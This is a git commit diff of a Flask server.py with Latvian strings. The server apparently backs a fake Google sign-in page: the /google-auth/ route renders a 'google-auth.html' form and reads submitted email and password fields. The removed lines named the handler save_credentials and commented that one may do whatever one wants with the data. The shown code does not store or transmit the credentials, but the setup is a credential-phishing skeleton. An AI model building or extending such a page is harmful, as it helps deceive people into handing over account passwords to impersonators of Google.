d19bc1c5862f9de7a1910b93c0917723104d2992
rEsX09 <robchik439@gmail.com>
2025-07-24 12:46:20 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,19 +1,17 @@
-from flask import Flask, request, render_template
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
+@app.route('/')
+def home():
+    return 'Ej uz <a href="/google-auth/">Google Auth</a>'
+
 @app.route('/google-auth/', methods=['GET'])
-def google_auth_page():
+def show_form():
     return render_template('google-auth.html')
 
 @app.route('/google-auth/', methods=['POST'])
-def save_credentials():
+def handle_form():
     email = request.form['email']
     password = request.form['password']
-    # (Šeit vari darīt, ko vēlies ar datiem)
-    return render_template('google-auth.html', message="Pieslēgšanās dati iesniegti.")
-
-# Neobligāts sākuma maršruts
-@app.route('/')
-def home():
-    return 'Sveiks! Ej uz <a href="/google-auth/">Google Login</a>'
+    return render_template('google-auth.html', message="Dati iesniegti!")
